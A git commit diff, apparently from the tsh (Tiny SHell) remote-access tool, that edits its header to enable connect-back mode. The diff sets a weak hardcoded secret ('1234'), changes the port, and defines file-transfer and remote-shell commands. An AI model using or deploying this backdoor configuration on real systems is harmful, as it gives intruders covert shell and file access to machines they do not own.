629938933328f3e526e1a7966b42771775224f47
Abel Romero Perez <abel@abelromero.com>
2018-01-28 15:51:11 +0100

    added support for connect back tshd by command-line

--- tsh.h
+++ tsh.h
@@ -1,14 +1,15 @@
 #ifndef _TSH_H
 #define _TSH_H
 
-char *secret = "never say never say die";
+char *secret = "1234";
+char *cb_host = NULL;
 
-#define SERVER_PORT 22
+#define SERVER_PORT 1234
 short int server_port = SERVER_PORT;
-/*
+
 #define CONNECT_BACK_HOST  "localhost"
-#define CONNECT_BACK_DELAY 30
-*/
+#define CONNECT_BACK_DELAY 5
+
 #define GET_FILE 1
 #define PUT_FILE 2
 #define RUNSHELL 3
